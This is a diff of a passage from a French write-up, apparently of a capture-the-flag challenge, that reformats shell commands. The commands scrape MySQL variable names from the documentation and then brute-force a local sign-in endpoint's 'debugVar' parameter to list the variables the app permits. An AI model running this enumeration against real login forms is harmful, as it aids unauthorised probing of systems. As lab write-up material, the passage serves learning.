@@ -97,21 +97,24 @@ surtout ... ça ne fonctionnait pas :)
 Ce step est assez simple.
 J'ai récupéré une bonne partie des variables systèmes de MySQL : 
 ```
->>> curl -s 'https://dev.mysql.com/doc/refman/5.7/en/server-system-variables.html'\
+>>> curl -s 'https://dev.mysql.com/doc/refman/5.7/en/server-system-variables.html' \
 | awk -F'[<>]' '/server-system.*class="literal/{!arr[$5]++}END{for (k in arr){print k}}' >> all_mysql_sysvar.lst
 ```
 
 Ca fait une petite liste de presque 300 vars.
 ```
->>> curl -s http://localhost:8000/signIn -d 'inputName=admin&inputPassword=lel&debugVar=connect_timeout&debugVal=lel'
+>>> curl -s http://localhost:8000/signIn \
+         -d 'inputName=admin&inputPassword=lel&debugVar=connect_timeout&debugVal=lel'
 {"html": "<span>Forbidden variable name!</span>"}
 ```
 
 Petite surprise, certaines sont interdites : j'ai donc "bruteforcé" pour connaître les vars autorisées.
 
 ```
->>> while read VAR; do curl -s http://localhost:8000/signIn -d "inputName=admin&inputPassword=lel&debugVar=$VAR&debugVal=lel" \
-|grep -q Forbidden || echo $VAR ; done < all_mysql_sysvar.lst >> allowed_mysql_vars.lst
+>>> while read VAR; do 
+curl -s http://localhost:8000/signIn \
+     -d "inputName=admin&inputPassword=lel&debugVar=$VAR&debugVal=lel" \
+     | grep -q Forbidden || echo $VAR ; done < all_mysql_sysvar.lst >> allowed_mysql_vars.lst
 >>> wc -l allowed_mysql_vars.lst 
 122 allowed_mysql_vars.lst
 ```
